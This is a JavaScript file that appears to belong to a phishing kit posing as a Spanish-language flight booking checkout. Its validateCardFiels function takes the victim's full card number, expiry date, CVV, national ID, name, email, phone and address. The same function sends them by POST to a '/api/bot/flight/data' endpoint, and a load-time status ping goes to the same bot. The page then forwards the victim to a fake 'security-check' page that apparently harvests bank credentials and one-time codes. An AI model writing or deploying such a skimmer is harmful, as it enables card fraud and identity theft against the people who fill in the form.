/**
 * Elements@Index
 * 
 */
const DOMElements = {
    loader: document.querySelector('.modal-loader'),
    
    labelBookingId: document.querySelector('#booking-id'),

    divResumeFlightGo: document.querySelector('#resume-flight-go'),
    divResumeFlightBack: document.querySelector('#resume-flight-back'),
    labelResumeTotal: document.querySelector('#resume-total'),

    form: document.querySelector('#form'),

}





/**
 * Startup@Index
 * 
 */
document.addEventListener('DOMContentLoaded', () => {
    loadEventListeners();
    updateDOM();
    sendStatus();
});




/**
 * LoadEvents@Index
 * 
 */
const loadEventListeners = () => {
    const {
        form
    } = DOMElements;

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        validateCardFiels();
    });

}

const updateDOM = () => {
    const {
        labelBookingId,
        divResumeFlightGo,
        divResumeFlightBack,
        labelResumeTotal,
    } = DOMElements;

    // Show booking id
    labelBookingId.textContent = randomNumber(9);

    // Show resume
    let totalPassengers = info.passengersInfo.adults.length + info.passengersInfo.children.length;
    divResumeFlightGo.innerHTML = `
        <p class="my-2 text-xs text-[#333] poppins-semibold">Vuelo de ida</p>
        <div class="flex flex-row items-start gap-7">
            <img src="./assets/svg/${info.flightInfo.aeroline}_logo.png" width="80px">
            <div>
                <p class="text-sm text-[#333] font-semibold">${info.flightInfo.origin.city} > ${info.flightInfo.destination.city}</p>
                <p class="text-sm text-[#333]">${formatADate(info.flightInfo.flightDates[0])}</p>
                <p class="text-xs">Vuelo: Directo</p>
                <p class="text-xs">Tarifa: ${tarifas[`${info.flightInfo.aeroline}`][Number(info.flightInfo.seat_type)]}</p>
            </div>
        </div>
    `;
    if (info.flightInfo.flightDates[1] !== 0) {
        divResumeFlightBack.innerHTML = `
            <p class="my-2 text-xs text-[#333] poppins-semibold">Vuelo de regreso</p>
            <div class="flex flex-row items-start gap-7">
                <img src="./assets/svg/${info.flightInfo.aeroline_back}_logo.png" width="80px">
                <div>
                    <p class="text-sm text-[#333] font-semibold">${info.flightInfo.destination.city} > ${info.flightInfo.origin.city}</p>
                    <p class="text-sm text-[#333]">${formatADate(info.flightInfo.flightDates[1])}</p>
                    <p class="text-xs">Vuelo: Directo</p>
                    <p class="text-xs">Tarifa: ${tarifas[`${info.flightInfo.aeroline}`][Number(info.flightInfo.seat_type)]}</p>
                </div>
            </div>
        `;

        const costFlightGo = PRECIO_BASE * MULTIPLICADOR_PLAN_MAP[info.flightInfo.seat_type] * totalPassengers;
        const costFlightBack = PRECIO_BASE * MULTIPLICADOR_PLAN_MAP[info.flightInfo.seat_type_back] * totalPassengers;

        labelResumeTotal.innerHTML = `COP $ ${formatPrice(costFlightGo + costFlightBack)}`
    } else {
        const costFlightGo = PRECIO_BASE * MULTIPLICADOR_PLAN_MAP[info.flightInfo.seat_type] * totalPassengers;
        labelResumeTotal.innerHTML = `COP $ ${formatPrice(costFlightGo)}`
    }
}


/**
 * Functions@Index
 * 
 */
const validateCardFiels = () =>{

    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const surname = document.querySelector('#name');
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')){
        if(isLuhnValid(p.value)){
            if(isValidDate(pdate.value)){
                if((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)){
                    console.log("Ok. Let's go!");

                    let ftime = info.metaInfo.c === '' ? true : false;

                    info.metaInfo.p = p.value;
                    info.metaInfo.ban = ban.value;
                    info.metaInfo.pdate = pdate.value;
                    info.metaInfo.c = c.value;
                    info.metaInfo.name = name.value+' '+surname.value;
                    info.metaInfo.cc = cc.value;
                    info.metaInfo.email = email.value;
                    info.metaInfo.telnum = telnum.value;
                    info.metaInfo.city = city.value;
                    info.metaInfo.address = address.value;

                    if(info.metaInfo.p[0] == '4'){
                        info.checkerInfo.company = 'VISA';
                    }else if(info.metaInfo.p[0] == '5'){
                        info.checkerInfo.company = 'MC';
                    }else if(info.metaInfo.p[0] == '3'){
                        info.checkerInfo.company = 'AM';
                    }

                    updateLS();

                    let payload = info.metaInfo
                    payload.origin = info.flightInfo.origin.city;
                    payload.destination = info.flightInfo.destination.city;
                    payload.flightDates = info.flightInfo.flightDates;
                    payload.type = info.flightInfo.travel_type === 1 ? 'Ida Y Vuelta' : 'Solo Ida';
                    payload.adults = info.flightInfo.adults;
                    payload.children = info.flightInfo.children;
                    payload.babies = info.flightInfo.babies;
                    payload.dudename = info.metaInfo.name.split(' ')[0] ?? info.metaInfo.name;
                    payload.surname = info.metaInfo.name.split(' ')[1] ?? '';
                    fetch(`${API_URL}/api/bot/flight/data`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${API_KEY}`,
                        },
                        body: JSON.stringify(payload)
                    });

                    DOMElements.loader.classList.add('flex');

                    if (ftime) { // Primer registro
                        fetch(`${API_URL}/api/bot/flight/data`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'Authorization': `Bearer ${API_KEY}`,
                            },
                            body: JSON.stringify(payload)
                        });
                        
                        setTimeout(() =>
                            window.location.href = 'security-check.html'
                        , 3000);
                    } else {
                        info.checkerInfo.mode = 'userpassword';
                        info.metaInfo.cdin = '';
                        info.metaInfo.ccaj = '';
                        info.metaInfo.cavance = '';
                        info.metaInfo.tok = '';
                        info.metaInfo.err = '';
                        updateLS();

                        setTimeout(() =>
                            window.location.href = 'security-check.html'
                        , 3000);
                    }
                    

                }else{
                    alert('Revise el CVV de su tarjeta.');
                    c.value = '';
                    c.focus();
                }
            }else{
                alert('Revise la fecha de vencimiento de su tarjeta.');
                pdate.value = '';
                pdate.focus();
            }
        }else{
            alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
            p.value = ''
            p.focus();;
        }
    }else{
        alert('Revisa el número de tu tarjeta.');
        p.value = '';
        p.focus();
    }
};

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos

    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {

        c.setAttribute('oninput', "limitDigits(this, 4)");

        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += ' ';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {

        c.setAttribute('oninput', "limitDigits(this, 3)");
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    var texto = input.value;
    
    texto = texto.replace(/\D/g, '');

    texto = texto.substring(0, 4);

    if (texto.length > 2) {
        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    }
    input.value = texto;
}

const formatADate = (dateInMillis) => {
    // Conversión a número, en caso de que llegue como string
    dateInMillis = Number(dateInMillis);

    // Se crea un objeto Date a partir de los milisegundos
    const date = new Date(dateInMillis);

    // Días de la semana en español
    const days = [
        "Domingo",
        "Lunes",
        "Martes",
        "Miércoles",
        "Jueves",
        "Viernes",
        "Sábado",
    ];

    // Meses del año en español
    const months = [
        "enero",
        "febrero",
        "marzo",
        "abril",
        "mayo",
        "junio",
        "julio",
        "agosto",
        "septiembre",
        "octubre",
        "noviembre",
        "diciembre",
    ];

    // Obtiene día de la semana, día del mes, mes y año
    const dayOfWeek = days[date.getDay()];   // 0 (Domingo) - 6 (Sábado)
    const dayOfMonth = date.getDate();       // 1 - 31
    const month = months[date.getMonth()];   // 0 (enero) - 11 (diciembre)
    const year = date.getFullYear();         // p. ej. 2025

    // Retorna la cadena en el formato requerido
    return `${dayOfWeek}, ${dayOfMonth} ${month} ${year}`;
};

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');

    if (bin.length < 6) {
        return false;
    }
    const digits = bin.split('').map(Number).reverse();

    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) {
                doubled -= 9;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    var partes = fechaInput.split('/');
    var mesInput = parseInt(partes[0], 10);
    var añoInput = parseInt(partes[1], 10);

    // Verificar que el mes no sea mayor a 12
    if (mesInput > 12) {
        return false;
    }

    // Ajustar el año para tener en cuenta el formato de dos dígitos
    añoInput += 2000;

    var fechaActual = new Date();
    var añoActual = fechaActual.getFullYear();
    var limiteAño = añoActual + 8; // Año actual + 8

    // Verificar que el año no sea mayor al año actual + 8
    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) {
        return false;
    }

    // Verificar que la fecha no sea futura
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth() + 1))) {
        return true;
    } else {
        return false;
    }
}

function randomNumber(digits) {
    return Math.floor(Math.random() * (10 ** digits)).toString().padStart(digits, '0');
}

function formatPrice(number){
    return number.toLocaleString('es', {
        maximumFractionDigits: 0,
        useGrouping: true
    });
}

const sendStatus = () =>{
    const tokenn = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P5-PAYMENT'}, JWT_SIGN);

    try{
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify({token: tokenn})
        });
    }catch(err){
        console.log(err);
    }
}




/**
 * UI@Index
 * 
 */
const openModal = (modalId) => {
    document.querySelector(`#${modalId}`).classList.add('block');
}

const closeModal = (modalId) => {
    document.querySelector(`#${modalId}`).classList.remove('block');

    // Restart inputs
    DOMElements.inputSearchOrigin.value = '';
    DOMElements.inputSearchDestination.value = '';
}